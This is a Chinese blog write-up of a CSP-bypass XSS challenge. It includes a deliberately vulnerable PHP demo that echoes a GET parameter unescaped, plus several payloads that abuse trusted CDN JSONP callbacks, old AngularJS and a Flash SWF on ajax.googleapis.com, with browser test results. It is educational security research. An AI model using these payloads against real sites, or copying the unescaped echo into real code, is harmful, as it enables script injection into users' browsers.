---
title: 有趣的cdn bypass CSP
date: 2017-02-16 16:46:19
tags:
- Blogs
- csp
categories:
- Blogs
---


最近在逛github的时候看到一个bypass csp的挑战，也是我最近才知道的一个新思路，一般人bypass csp都是通过允许域下的某个漏洞构造文件绕过，但是其实往往没人注意到cdn的问题。

<!--more-->

先贴上原文
[https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22)

这个利用方式其实我在ctf里也遇到过
[https://blog.0daylabs.com/2016/09/09/bypassing-csp/](https://blog.0daylabs.com/2016/09/09/bypassing-csp/)

我们写个简单的demo

```
<?php
header('Content-Security-Policy: default-src \'self\' ajax.googleapis.com');
header('Content-Type: text/html; charset=utf-8');
header('X-Frame-Options: deny');
header('X-Content-Type-Options: nosniff');
?><!doctype html>
<html>
<head>
<title>Sh*t, it's CSP!</title>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
</head>
<body class="<?php echo $_GET['xss']; ?>">
   test
</body>
<!--
<?php readfile(__FILE__); ?>
```

这里我们的目标是`alert(1337)`

我们随便输入个xss试试，很明显会被CSP拦截

![image_1b92k6r661kgrdc1eugk341mdk9.png-88.3kB][1]

假设场景内，我们没办法在域内找到任何带有xss内容的文件，这里我们还有什么办法呢，让我们来看看CSP设置

```
Content-Security-Policy:default-src 'self' ajax.googleapis.com
```

我们往往会习惯性的忽略cdn，因为在没有0day的情况下，我们不能有任何办法在ajax.googleapis.com域下构造任何文件

但其实有2个办法构造：

# 1 用cdn的回调函数

payload:
```
http://127.0.0.1/ctest/test.php?xss=%22%3E%3Cscript%20src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert&context=1337%3E%3C/script%3E
```

这是使用了cdn中不同api的回调函数，但是这对浏览器是有要求的，在最新版chrome上测试是这样的

```
The XSS Auditor refused to execute a script in 'http://127.0.0.1/ctest/test.php?xss=%22%3E%3Cscript%20src=//ajax.googleapis…/ajax/services/feed/find?v=1.0&callback=alert&context=1337%3E%3C/script%3E' because its source code was found within the request. The auditor was enabled as the server sent neither an 'X-XSS-Protection' nor 'Content-Security-Policy' header.
```

被The XSS Auditor拦截了

firefox上运行成功了

![image_1b92vql4u168var51av2d6r1505m.png-98.8kB][2]



# 通过目录绕过，引入一个AngularJS

```
http://127.0.0.1/ctest/test.php?xss=ng-app%22ng-csp%20ng-click=$event.view.alert(1337)%3E%3Cscript%20src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js%3E%3C/script%3E
```

在cdn中，不可能仅有jquery，当然也有别的，这里就用比较特别的AngularJS。

只不过chrome仍然会拦

```
The XSS Auditor refused to execute a script in 'http://127.0.0.1/ctest/test.php?xss=ng-app%22ng-csp%20ng-click=$event.view.…//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js%3E%3C/script%3E' because its source code was found within the request. The auditor was enabled as the server sent neither an 'X-XSS-Protection' nor 'Content-Security-Policy' header.

test.php:1 Refused to load the script 'about:blank' because it violates the following Content Security Policy directive: "default-src 'self' ajax.googleapis.com". Note that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
```

在firefox上也被拦截了

![image_1b92vvh80e581a0i1eh51hq81hb13.png-76.6kB][3]

有点迷，我感觉应该是一定会被拦的，即便是引入了AngularJS，也是在当前页添加了js...

csp中需要添加unsafe-inline才能执行成功

还有一个引入了Prototype.JS 和AngularJS两种的，但同样没有执行成功

```
"ng-app ng-csp><base href=//ajax.googleapis.com/ajax/libs/><script src=angularjs/1.0.1/angular.js></script><script src=prototype/1.7.2.0/prototype.js></script>{{$on.curry.call().alert(1337
```

还有另一个payload，firefox执行成功了，但是chrome失败了

```
http://119.29.192.14/test.php?xss="><script src="//ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js"></script><div ng-app ng-csp id=p ng-click=$event.view.alert(1337)><script async src=//ajax.googleapis.com/jsapi?callback=p.click></script>
```

这个需要一个较早版本的angular js，通过api的回调执行

# 利用flash

这个payload有点儿迷
```
"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>
```

这是利用了google的api中有个不安全的flash，它允许使用ExternalInterface XSS，所以就有了上面的payload，奇怪的是，chrome仍然拦截了

但firefox通过了

![image_1b9312f3u1h7a1tm411elpi7kq81g.png-100.5kB][4]


总的来说还是挺迷的，因为这种方式在chrome里几乎完全被拦截了，但还是提供一个比较新颖的思路，通过大家对cdn的盲目信任绕过csp限制W


  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/51ax0b15rzpbeomk30waym23/image_1b92k6r661kgrdc1eugk341mdk9.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/xfbijx2m25ge3jrjrve4c05t/image_1b92vql4u168var51av2d6r1505m.png
  [3]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/zjuliwh7r0cpybw1owp3ndvf/image_1b92vvh80e581a0i1eh51hq81hb13.png
  [4]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/twy05rjcpid3kh8rqdhnbd8z/image_1b9312f3u1h7a1tm411elpi7kq81g.png